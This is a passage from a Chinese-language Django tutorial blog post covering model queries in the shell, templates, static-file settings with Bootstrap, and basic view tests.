class="line">board.save()</span><br></pre></td></tr></table></figure><p><code>save</code>方法用于创建和更新对象。这里Django创建了一个新对象，因为这时<strong>Board</strong> 实例没有id。第一次保存后，Django会自动设置ID：</p><p><code class="highlighter-rouge">board.id<br>1</code></p><p>可以将其余的字段当做Python属性访问：</p><p>如图：<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20422django07.jpg" alt=""></p><p>要更新一个值，我们可以这样做：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">board.description = <span class="string">'Django discussion board.'</span></span><br><span class="line">board.save()</span><br></pre></td></tr></table></figure><p>每个Django模型都带有一个特殊的属性; 我们称之为<strong>模型管理器(Model Manager)</strong>。你可以通过属性<code>objects</code>来访问这个管理器，它主要用于数据库操作。例如，我们可以使用它来直接创建一个新的Board对象：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">board = Board.objects.create(name=<span class="string">'Python'</span>, description=<span class="string">'General discussion about Python.'</span>)</span><br></pre></td></tr></table></figure><p>访问属性：<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20422django08.jpg" alt=""></p><p>所以，现在我们有两个版块了。我们可以使用<code>objects</code>列出数据库中所有现有的版块：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Board.objects.all()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>Board.objects.all()</span><br><span class="line">&lt;QuerySet [&lt;Board: Board object&gt;, &lt;Board: Board object&gt;]&gt;</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>结果是一个<code>QuerySet</code>。稍后我们会进一步了解。基本上，它是从数据库中查询的对象列表。我们看到有两个对象，但显示的名称是 Board object。这是因为我们尚未实现 <strong>Board</strong> 的<code>__str__</code>方法。</p><p><code>__str__</code>方法是对象的字符串表示形式。我们可以使用版块的名称来表示它。</p><p>首先，退出交互式控制台：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exit()</span><br></pre></td></tr></table></figure><p>现在编辑boards app 中的 <strong>models.py</strong> 文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Board</span><span class="params">(models.Model)</span>:</span></span><br><span class="line">    name = models.CharField(max_length=<span class="number">30</span>, unique=<span class="literal">True</span>)</span><br><span class="line">    description = models.CharField(max_length=<span class="number">100</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.name</span><br></pre></td></tr></table></figure><p>重新查询，再次进入交互式控制台：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> boards.models <span class="keyword">import</span> Board</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>Board.objects.all()</span><br><span class="line">&lt;QuerySet [&lt;Board: Django&gt;, &lt;Board: Python&gt;]&gt;</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>我们可以将这个QuerySet看作一个列表。假设我们想遍历它并打印每个版块的描述：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>boards_list = Board.objects.all()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> board <span class="keyword">in</span> boards_list:</span><br><span class="line"><span class="meta">... </span>    print(board.description)</span><br><span class="line"><span class="meta">... </span></span><br><span class="line">Django discussion board.</span><br><span class="line">General discussion about Python.</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>同样，我们可以使用模型的 <strong>管理器（Manager）</strong> 来查询数据库并返回单个对象。为此，我们要使用 <code>get</code>方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>django_board = Board.objects.get(id=<span class="number">1</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>django_board.name</span><br><span class="line"><span class="string">'Django'</span></span><br></pre></td></tr></table></figure><p>但我们必须小心这种操作。如果我们试图查找一个不存在的对象，例如，查找id=3的版块，它会引发一个异常：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>board = Board.objects.get(id=<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">boards.models.DoesNotExist: Board matching query does <span class="keyword">not</span> exist.</span><br></pre></td></tr></table></figure><p><code>get</code>方法的参数可以是模型的任何字段，但最好使用可唯一标识对象的字段来查询。否则，查询可能会返回多个对象，这也会导致异常。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>Board.objects.get(name=<span class="string">'Django'</span>)</span><br><span class="line">&lt;Board: Django&gt;</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>请注意，查询区分大小写，小写“django”不匹配：</p><table border="1">  <tr>    <th width=10%, bgcolor=#77787b >操作</th>    <th width=40%, bgcolor=#d9d6c3>代码示例</th>  </tr>  <tr>    <td>创建一个对象而不保存</td>    <td>board = Board()</td>  </tr>  <tr>    <td bgcolor=#d9d6c3>保存一个对象（创建或更新）</td>    <td>board.save()</td>  </tr>  <tr>    <td>数据库中创建并保存一个对象</td>    <td>Board.objects.create(name='...',description='...')</td>  </tr>  <tr>    <td bgcolor=#d9d6c3>列出所有对象</td>    <td>Board.objects.all()</td>  </tr>   <tr>    <td>通过字段标识获取单个对象</td>    <td>Board.objects.get(id=1)</td>  </tr></table><h2 id="视图，模板，静态文件"><a href="#视图，模板，静态文件" class="headerlink" title="视图，模板，静态文件"></a>视图，模板，静态文件</h2><p>目前我们已经有一个视图函数叫home,这个视图在我们的应用程序主页上显示为“Hello，World！”</p><p><strong>myproject/urls.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.conf.urls <span class="keyword">import</span> url</span><br><span class="line"><span class="keyword">from</span> django.contrib <span class="keyword">import</span> admin</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> boards <span class="keyword">import</span> views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    url(<span class="string">r'^$'</span>, views.home, name=<span class="string">'home'</span>),</span><br><span class="line">    url(<span class="string">r'^admin/'</span>, admin.site.urls),</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p><strong>boards/views.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpResponse</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">home</span><span class="params">(request)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">'Hello, World!'</span>)</span><br></pre></td></tr></table></figure><p>我们可以从这里开始写。如果你回想起我们的原型图，图5显示了主页应该是什么样子。我们想要做的是在表格中列出一些版块的名单以及它们的描述信息。</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20426django0011.png" alt=""></p><p>首先要做的是导入<strong>Board</strong>模型并列出所有的版块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpResponse</span><br><span class="line"><span class="keyword">from</span> .models <span class="keyword">import</span> Board</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">home</span><span class="params">(request)</span>:</span></span><br><span class="line">    boards = Board.objects.all()</span><br><span class="line">    boards_names = list()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> board <span class="keyword">in</span> boards:</span><br><span class="line">        boards_names.append(board.name)</span><br><span class="line"></span><br><span class="line">    response_html = <span class="string">'&lt;br&gt;'</span>.join(boards_names)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> HttpResponse(response_html)</span><br></pre></td></tr></table></figure><p>运行结果就是这个简单的HTML页面：</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20422django09.jpg" alt=""></p><p>真正的项目里面我们不会这样去渲染HTML。对于这个简单视图函数，我们做的就是列出所有版块，然后渲染部分是Django模板引擎的职责。</p><h3 id="Django模板引擎设置"><a href="#Django模板引擎设置" class="headerlink" title="Django模板引擎设置"></a>Django模板引擎设置</h3><p>在<strong>manage.py</strong>所在的目录创建一个名为 <strong>templates</strong>的新文件夹：</p><figure class="highlight"><pre><code class="language-bash" data-lang="bash">myproject/ |-- myproject/ |    |-- boards/ |    |-- myproject/ |    |-- templates/   &lt;-- 这里 |    +-- manage.py +-- venv/</code></pre></figure><p>在<strong>templates</strong>文件夹中，创建一个名为<strong>home.html</strong>的HTML文件：</p><p><strong>templates/home.html</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Boards<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Boards<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    &#123;% for board in boards %&#125;</span><br><span class="line">      &#123;&#123; board.name &#125;&#125; <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    &#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在上面的例子中，我们混入了原始HTML和一些特殊标签 <code>{% for ... in ... %} </code>和<code>{{ variable }}</code> 。它们是Django模板语言的一部分。上面的例子展示了如何使用 <code>for</code>遍历列表对象。<code>{{ board.name }}</code>会在 HTML 模板中会被渲染成版块的名称，最后生成动态HTML文档。</p><p>在我们可以使用这个HTML页面之前，我们必须告诉Django在哪里可以找到我们应用程序的模板。</p><p>打开<strong>myproject</strong>目录下面的<strong>settings.py</strong>文件，搜索<code>TEMPLATES</code>变量，并设置<code>DIRS</code> 的值为<code>os.path.join(BASE_DIR, &#39;templates&#39;)</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">TEMPLATES = [</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">'BACKEND'</span>: <span class="string">'django.template.backends.django.DjangoTemplates'</span>,</span><br><span class="line">        <span class="string">'DIRS'</span>: [</span><br><span class="line">            os.path.join(BASE_DIR, <span class="string">'templates'</span>)</span><br><span class="line">        ],</span><br><span class="line">        <span class="string">'APP_DIRS'</span>: <span class="literal">True</span>,</span><br><span class="line">        <span class="string">'OPTIONS'</span>: &#123;</span><br><span class="line">            <span class="string">'context_processors'</span>: [</span><br><span class="line">                <span class="string">'django.template.context_processors.debug'</span>,</span><br><span class="line">                <span class="string">'django.template.context_processors.request'</span>,</span><br><span class="line">                <span class="string">'django.contrib.auth.context_processors.auth'</span>,</span><br><span class="line">                <span class="string">'django.contrib.messages.context_processors.messages'</span>,</span><br><span class="line">            ],</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>本质上，刚添加的这一行所做的事情就是找到项目的完整路径并在后面附加“/templates”</p><p>我们可以使用Python shell进行调试</p><figure class="highlight"><pre><code class="language-bash" data-lang="bash">python manage.py shell</code></pre></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> django.conf <span class="keyword">import</span> settings</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>settings.BASE_DIR</span><br><span class="line"><span class="string">'/home/humen/Development/myproject/myproject'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.path.join(settings.BASE_DIR,<span class="string">'templates'</span>)</span><br><span class="line"><span class="string">'/home/humen/Development/myproject/myproject/templates'</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>从上面看到，添加部分只是指向我们在前面步骤中创建的<strong>templates</strong>文件夹</p><p>现在我们可以更新<strong>home</strong>视图：</p><p><strong>boards/views.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render</span><br><span class="line"><span class="keyword">from</span> .models <span class="keyword">import</span> Board</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">home</span><span class="params">(request)</span>:</span></span><br><span class="line">    boards = Board.objects.all()</span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">'home.html'</span>, &#123;<span class="string">'boards'</span>: boards&#125;)</span><br></pre></td></tr></table></figure><p>生成HTML；</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20422django10.jpg" alt=""></p><p>我们可以用一个更漂亮的表格来替换，改进HTML模板：</p><p><strong>templates/home.html</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Boards<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Boards<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">thead</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">th</span>&gt;</span>Board<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">th</span>&gt;</span>Posts<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">th</span>&gt;</span>Topics<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">th</span>&gt;</span>Last Post<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span><br><span class="line">        &#123;% for board in boards %&#125;</span><br><span class="line">          <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">              &#123;&#123; board.name &#125;&#125;<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">small</span> <span class="attr">style</span>=<span class="string">"color: #888"</span>&gt;</span>&#123;&#123; board.description &#125;&#125;<span class="tag">&lt;/<span class="name">small</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>0<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>0<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        &#123;% endfor %&#125;</span><br><span class="line">      <span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20422django11.jpg" alt=""></p><h3 id="测试主页"><a href="#测试主页" class="headerlink" title="测试主页"></a>测试主页</h3><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20426django0016.png" alt=""></p><p>测试将是一个反复出现的主题，我将在学习整个教程系列中探讨不同的概念和策略。</p><p>开始写第一个测试。现在，我们将在<strong>boards</strong>应用程序内的<strong>tests.py</strong>文件中操作</p><p><strong>boards/tests.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.core.urlresolvers <span class="keyword">import</span> reverse</span><br><span class="line"><span class="keyword">from</span> django.test <span class="keyword">import</span> TestCase</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HomeTests</span><span class="params">(TestCase)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_home_view_status_code</span><span class="params">(self)</span>:</span></span><br><span class="line">        url = reverse(<span class="string">'home'</span>)</span><br><span class="line">        response = self.client.get(url)</span><br><span class="line">        self.assertEquals(response.status_code, <span class="number">200</span>)</span><br></pre></td></tr></table></figure><p>这是一个非常简单但非常有用的测试用例，我们测试的是请求该URL后返回的响应状态码。状态码200意味着成功。</p><p>请求一下主页后，我们可以在控制台中看到响应的状态代码：</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/40426django01.png" alt=""></p><p>如果出现未捕获的异常，语法错误或其他任何情况，Django会返回状态代码<strong>500</strong>，这意味着是<strong>内部服务器错误</strong>。现在，想象我们的应用程序有100个视图函数。如果我们为所有视图编写这个简单的测试，只需一个命令，我们就能够测试所有视图是否返回成功代码，因此用户在任何地方都看不到任何错误消息。如果没有自动化测试，我们需要逐一检查每个页面是否有错误。</p><p>执行Django的测试套件：</p><p><code>python manage.py test</code></p><p>测试结果：<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/40426django02.png" alt=""></p><p>现在我们可以测试Django是否在请求的URL的时候返回了正确的视图函数。这也是一个有用的测试，因为随着开发的进展，您会发现<strong>urls.py</strong>模块可能变得非常庞大而复杂。URL conf 全部是关于解析正则表达式的。有些情况下有一个非常宽容的URL（译注：本来不应该匹配的，却因为正则表达式写的过于宽泛而错误的匹配了），所以Django最终可能返回错误的视图函数。</p><p>我们可以这样做：</p><p><strong>boards/tests.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.core.urlresolvers <span class="keyword">import</span> reverse</span><br><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> resolve</span><br><span class="line"><span class="keyword">from</span> django.test <span class="keyword">import</span> TestCase</span><br><span class="line"><span class="keyword">from</span> .views <span class="keyword">import</span> home</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HomeTests</span><span class="params">(TestCase)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_home_view_status_code</span><span class="params">(self)</span>:</span></span><br><span class="line">        url = reverse(<span class="string">'home'</span>)</span><br><span class="line">        response = self.client.get(url)</span><br><span class="line">        self.assertEquals(response.status_code, <span class="number">200</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_home_url_resolves_home_view</span><span class="params">(self)</span>:</span></span><br><span class="line">        view = resolve(<span class="string">'/'</span>)</span><br><span class="line">        self.assertEquals(view.func, home)</span><br></pre></td></tr></table></figure><p>在第二个测试中，我们使用了<code>resolve</code>函数。Django使用它来将浏览器发起请求的URL与<strong>urls.py</strong>模块中列出的URL进行匹配。该测试用于确定URL <code>/</code>返回 home 视图。</p><p>再次测试：</p><p><code>python manage.py test</code></p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/40426django03.png" alt=""></p><p>要查看有关测试执行时更详细的信息，可将<strong>verbosity</strong>的级别设置得更高一点：</p><p><code>python manage.py test --verbosity=2</code></p><p>测试结果：<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/40426django04.png" alt=""></p><p><strong>verbosity</strong>决定了将要打印到控制台的通知和调试信息量; 0是无输出，1是正常输出，2是详细输出。</p><h3 id="静态文件设置"><a href="#静态文件设置" class="headerlink" title="静态文件设置"></a>静态文件设置</h3><p>静态文件是指 CSS，JavaScript，字体，图片或者是用来组成用户界面的任何其他资源。</p><p>实际上，Django 本身是不负责处理这些文件的，但是为了让我们的开发过程更轻松，Django 提供了一些功能来帮助我们管理静态文件。这些功能可在 <code>INSTALLED_APPS</code> 的 <strong>django.contrib.staticfiles</strong> 应用程序中找到（译者：Django为了使得开发方便，也可以处理静态文件，而在生产环境下，静态文件一般直接由 Nginx 等反向代理服务器处理，而应用服务器专心负责处理它擅长的业务逻辑）</p><p>市面上很多优秀前端组件框架，我们没有理由继续用简陋的HTML文档来渲染。我们可以轻松地将Bootstrap 4添加到我们的项目中。Bootstrap是一个用HTML，CSS和JavaScript开发的前端开源工具包。</p><p>在项目根目录中，除了<strong>boards, templates 和myproject</strong>文件夹外，再创建一个名为<strong>static</strong>的新文件夹，并在<strong>static</strong>文件夹内创建另一个名为<strong>css</strong>的文件夹：</p><figure class="highlight"><pre><code class="language-bash" data-lang="bash">myproject/ |-- myproject/ |    |-- boards/ |    |-- myproject/ |    |-- templates/ |    |-- static/       &lt;-- here |    |    +-- css/     &lt;-- and here |    +-- manage.py +-- venv/</code></pre></figure><p>转到<a href="https://github.com/twbs/bootstrap/releases/download/v4.4.1/bootstrap-4.4.1-dist.zip" target="_blank" rel="noopener">getbootstrap.com</a>并下载最新版本：</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20426django0017.png" alt=""></p><p>下载编译版本的CSS和JS</p><p>在你的计算机中，解压 <strong>bootstrap-4.0.0-beta-dist.zip</strong> 文件，将文件 <strong>css/bootstrap.min.css</strong> 复制到我们项目的css文件夹中：</p><figure class="highlight"><pre><code class="language-bash" data-lang="bash">myproject/ |-- myproject/ |    |-- boards/ |    |-- myproject/ |    |-- templates/ |    |-- static/ |    |    +-- css/ |    |         +-- bootstrap.min.css    &lt;-- here |    +-- manage.py +-- venv/</code></pre></figure><p>下一步是告诉Django在哪里可以找到静态文件。打开<strong>settings.py</strong>，拉到文件的底部，在<strong>STATIC_URL</strong>后面添加以下内容：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">STATIC_URL = <span class="string">'/static/'</span></span><br><span class="line"></span><br><span class="line">STATICFILES_DIRS = [</span><br><span class="line">    os.path.join(BASE_DIR, <span class="string">'static'</span>),</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p><strong>TEMPLATES</strong>目录和这个配置是一样的</p><p>必须在模板中加载静态文件（Bootstrap CSS文件）：</p><p><strong>templates/home.html</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&#123;% load static %&#125;<span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Boards<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> 